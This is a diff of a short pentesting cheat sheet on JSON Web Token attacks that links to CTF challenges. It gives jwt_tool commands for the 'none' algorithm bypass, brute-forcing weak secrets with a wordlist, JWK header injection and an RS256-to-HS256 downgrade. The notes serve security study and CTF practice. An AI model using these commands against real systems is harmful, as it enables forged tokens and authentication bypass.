@@ -1,9 +1,6 @@
 # JSON Web Token (JWT)
 
 [![hacking_jwt](../../../../_badges/hacktricks/hacking_jwt.svg)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
-[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
-[![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
-[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -13,6 +10,9 @@ The format is: `<algo>.<data>.<signature>`. Each part is base64 encoded, so the 
 
 The data is signed using a secret key. If the secret key is compromised, everyone can sign messages 🔏.
 
+The signature is used to detect if data was tampered with.
+</div><div>
+
 They can be transferred and found in:
 
 * 📚 Headers (`Authorization: Bearer <JWT>`)
@@ -21,32 +21,71 @@ They can be transferred and found in:
 * 💼 Request Body
 * ...
 
-To play around with a JWT cookie, you can use [jwt.io](https://jwt.io/).
-</div><div>
+📚 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
+</div></div>
 
-You can also use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(4.8k ⭐)</small>:
+<hr class="sep-both">
+
+## Common JWT Attacks
+
+[![hacking_jwt](../../../../_badges/hacktricks/hacking_jwt.svg)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
+
+<div class="row row-cols-lg-2"><div>
+
+You can use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(4.8k ⭐)</small> to attack JWT:
 
 ```shell!
-$ cd /opt
-$ sudo git clone https://github.com/ticarpi/jwt_tool
-$ cd jwt_tool && pip3 install -r requirements.txt
-$ sudo chmod +x /opt/jwt_tool/jwt_tool.py
-$ sudo ln -s /opt/jwt_tool/jwt_tool.py /usr/bin/jwt_tool
+$ git clone https://github.com/ticarpi/jwt_tool.git $HOME/tools/jwt_tool
+$ chmod +x $HOME/tools/jwt_tool/jwt_tool.py
+$ ln -s $HOME/jwt_tool/jwt_tool.py $HOME/.local/bin/jwt_tool
 $ jwt_tool -h
 ```
-
-Common usages:
 
 ```ps
 $ jwt_tool 'jwt'             # decode
 $ jwt_tool 'jwt' -T          # encode
+```
+
+You can also use [jwt.io](https://jwt.io/).
+
+#### None Algorithm
+
+[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
+
+We may be able to disable the tampering check by setting the signature algorithm to 'none.'
+
+```ps
 $ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
-$ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
+```
+</div><div>
+
+#### Secret Key Brute Forcing
+
+[![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
+
+The secret key may be weak and brute forced:
+
+```ps
 $ jwt_tool 'jwt' -T -p "key" # use secret key
 $ jwt_tool 'jwt' -C -d /tmp/jwt.secrets.list # crack key
 ```
 
-📚 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
+#### JWK Header Injection
+
+[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
+
+```ps
+$ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
+```
+
+#### JWK Public Key
+
+When using RS256 algorithm, JWT uses the private key to edit data and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.
+
+```ps
+$ jwt_tool 'jwt' -S hs256 -k public.key -T
+```
+
 </div></div>
 
 <hr class="sep-both">
